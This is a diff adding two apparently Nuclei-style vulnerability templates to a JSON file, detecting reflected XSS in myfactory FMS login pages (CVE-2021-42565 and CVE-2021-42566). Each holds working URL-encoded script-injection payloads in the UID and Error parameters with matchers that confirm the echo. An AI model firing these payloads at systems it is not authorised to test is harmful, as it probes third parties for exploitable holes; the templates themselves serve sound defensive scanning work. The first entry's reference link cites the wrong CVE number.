@@ -37496,6 +37496,112 @@
           ]
         }
       ]
+    },
+    {
+      "id": "CVE-2021-42565",
+      "info": {
+        "author": "madrobot",
+        "classification": {
+          "cve-id": "CVE-2021-42565",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "myfactory.FMS before 7.1-912 allows XSS via the UID parameter.",
+        "name": "myfactory FMS  -  Reflected XSS",
+        "reference": [
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-42566",
+          "https://www.redteam-pentesting.de/en/advisories/rt-sa-2021-001/-cross-site-scripting-in-myfactory-fms"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,myfactory,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ie50/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "{{BaseURL}}/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-42566",
+      "info": {
+        "author": "madrobot",
+        "classification": {
+          "cve-id": "CVE-2021-42566",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "myfactory.FMS before 7.1-912 allows XSS via the Error parameter.",
+        "name": "myfactory FMS  -  Reflected XSS",
+        "reference": [
+          "https://www.redteam-pentesting.de/en/advisories/rt-sa-2021-001/-cross-site-scripting-in-myfactory-fms",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-42566"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,myfactory,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ie50/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "{{BaseURL}}/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
     }
   ]
 }
